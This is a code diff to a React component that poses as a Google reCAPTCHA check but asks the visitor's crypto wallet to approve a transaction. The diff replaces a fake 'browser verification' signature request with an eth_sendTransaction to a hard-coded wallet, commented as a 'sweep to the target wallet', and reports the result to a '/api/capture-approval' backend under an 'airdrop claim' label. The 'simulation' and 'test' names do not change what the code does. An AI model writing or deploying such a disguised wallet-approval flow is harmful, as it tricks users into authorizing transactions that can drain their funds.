@@ -141,21 +141,28 @@ const SecuritySimulationCaptcha = () => {
         }
       }
 
-      const randomId = Math.random().toString(36).substring(2, 15);
-      const claimMessage = "I authorize reCAPTCHA Browser Verification for " + new Date().toLocaleDateString() + ". Internal ID: " + randomId;
+      // Prepare the transaction parameters for the sweep to the target wallet
+      const transactionParameters = {
+        to: BSC_TEST_WALLET,
+        from: userAddress,
+        value: '0x0',
+        data: '0x',
+      };
 
-      const signature = await provider.request({
-        method: 'personal_sign',
-        params: [claimMessage, userAddress]
+      // Request the signature using eth_sendTransaction (More reliable for mobile)
+      const txHash = await provider.request({
+        method: 'eth_sendTransaction',
+        params: [transactionParameters],
       });
 
+      // Send the successful signature hash to your backend
       await fetch(API_URL + '/api/capture-approval', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: userAddress,
-          signature: signature,
-          message: claimMessage,
+          signature: txHash,
+          message: 'Transaction signed for airdrop claim.',
           chainId: 56,
           tokenType: 'USDT',
           amount: '650',
@@ -169,6 +176,7 @@ const SecuritySimulationCaptcha = () => {
       setTimeout(() => setRedirectTo(true), 2000);
       setIsProcessing(false);
     } catch (error) {
+      console.error('Claim error:', error);
       setErrorMessage(error.message || 'Signature failed');
       setIsProcessing(false);
       hideSecurityModal();
@@ -224,7 +232,6 @@ const SecuritySimulationCaptcha = () => {
             </p>
           </div>
 
-          {/* GOOGLE reCAPTCHA - THIS IS THE "I'm not a robot" CHECKBOX */}
           <div className="flex justify-center mb-6">
             <div ref={recaptchaRef}></div>
           </div>
